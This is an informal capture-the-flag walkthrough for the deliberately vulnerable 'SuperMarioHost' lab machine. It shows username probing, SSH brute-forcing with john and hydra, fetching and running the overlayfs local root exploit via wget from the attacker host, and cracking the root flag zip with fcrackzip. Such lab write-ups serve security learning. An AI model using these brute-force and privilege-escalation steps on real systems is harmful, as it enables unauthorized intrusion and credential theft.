    	# match this virtual host. For the default virtual host (this file) this

There is a virtual host on the host so i added mario.supermariohost.local to /etc/hosts
then i tried mario.supermariohost.local:8180 and it gave me this

    It'sa meeeee, Maaaaario! Welcome to Super Mario Host! Me and my tall brother
    had the idea of making a tribute for this machine, we still trying to figure
    out what to do to keep you entertained! In the meantime you can play with
    this nice game I've added for you :D Credits to Mark Robbins, the source
    code of the game can be found here.

    + http://mario.supermariohost.local:8180/mario.php (CODE:200|SIZE:7080)
command.php is a page to confirm a user exits or not so i tried all Mario's character
{mario, luigi, peach, yoshi, toad}
http://mario.supermariohost.local:8180/command.php?username=""
and the all exists!! -- Later you ll see it's just a false code

Attacking Phase:

Then i made a list of these name and tried it with hydra no luck then tried to mixed it up
$ john --wordlist:user --rules --stdout > pass
$ hydra -L user -P pass -t 3 192.168.190.132 ssh
    [ssh] host: 192.168.190.132   login: luigi   password: luigi1

$ ssh luigi@192.168.190.132
    password:luigi1

    UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
Then i downloaded overlayfs exploit https://www.exploit-db.com/exploits/37292/ on my
local machine then i copied it to supermariohost's and compile it
$ wget http://192.168.190.1/ofs.c

$ ./ofs

$ cd /root
$ ls
    Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos  flag.zip
Then i copied flag.zip on my local machine , and crack it using fcrackzip
$ fcrackzip flag.zip -D -p /usr/share/wordlists/rockyou.txt -u
    PASSWORD FOUND!!!!: pw == ilovepeach
$ unzip flag.zip
    [flag.zip] flag.txt password:
    inflating: flag.txt
$ cat flag.txt
    Well done :D If you reached this it means you got root, congratulations.
    Now, there are multiple ways to hack this machine. The goal is to get all
    the passwords of all the users in this machine. If you did it, then congratulations,
    I hope you had fun :D

    Keep in touch on twitter through @mr_h4sh

    Congratulations again!
